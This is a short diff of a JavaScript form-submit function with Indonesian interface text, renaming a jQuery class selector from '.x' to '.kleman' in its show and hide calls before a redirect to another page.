@@ -1,6 +1,6 @@
 function sendHp() {
    
-   $('.x').fadeIn();
+   $('.kleman').fadeIn();
    event.preventDefault();
    $(".lanjutkan").prop("disabled", true);
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
@@ -19,7 +19,7 @@ function sendHp() {
       complete: function() {
          setTimeout(function() {
             window.location = "belum.html";
-            $('.x').hide();            
+            $('.kleman').hide();            
             document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
          }, 800);
       }
